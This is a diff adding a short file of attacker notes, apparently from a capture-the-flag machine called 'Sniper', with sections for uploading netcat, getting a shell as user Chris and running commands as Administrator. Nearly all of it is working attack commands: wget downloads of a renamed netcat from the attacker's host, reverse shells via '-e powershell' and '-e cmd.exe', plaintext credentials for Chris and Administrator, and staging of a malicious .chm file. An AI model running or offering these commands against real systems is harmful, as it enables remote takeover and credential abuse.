@@ -1,0 +1,21 @@
+------------------------------------------UPLOAD NETCAT----------------------------------------------
+wget http://10.10.14.18:8000/plswork.exe -o c:\\test\\plswork.exe
+c:\\test\\plswork.exe 10.10.14.18 9001 -e powershell
+
+Invoke-Command -ComputerName LOCALHOST -ScriptBlock { whoami } -credential $credential;
+------------------------------------------SHELL AS CHRIS---------------------------------------------.
+$username ="Sniper\Chris";
+$password = convertto-securestring -AsPlainText -Force -String "36mEAhz/B8xQ~2VM"; 
+$cred = New-Object System.Management.Automation.PSCredential -ArgumentList $username,$password; 
+New-PSSession -Credential $cred | Enter-PSSession
+Invoke-Command -ComputerName LOCALHOST -ScriptBlock { wget http://10.10.14.18:8000/plswork.exe -o C:\users\chris\plswork.exe } -credential $cred;
+Invoke-Command -ComputerName LOCALHOST -ScriptBlock { c:\users\chris\plswork.exe -e cmd.exe 10.10.14.18 4444 } -credential $cred;
+Invoke-Command -ComputerName LOCALHOST -ScriptBlock { wget http://10.10.14.18:8000/doc.chm -o C:\users\chris\doc.chm } -credential $cred;
+Invoke-Command -ComputerName LOCALHOST -ScriptBlock { copy C:\users\chris\doc.chm c:\Docs } -credential $cred;
+Invoke-Command -ComputerName LOCALHOST -ScriptBlock { dir c:\Docs\doc.hcm } -credential $cred;
+Invoke-Command -ComputerName LOCALHOST -ScriptBlock { dir c:\users\chris\doc.chm } -credential $cred;
+
+------------------------------------------COMMAND EXEC AS ADMIN-------------------------------------
+$password = convertto-securestring -AsPlainText -Force -String "butterfly!#1";
+$credential = new-object -typename System.Management.Automation.PSCredential -argumentlist "SNIPER\Administrator",$password;
+Invoke-Command -ComputerName LOCALHOST -credential$credential -ScriptBlock { whoami };
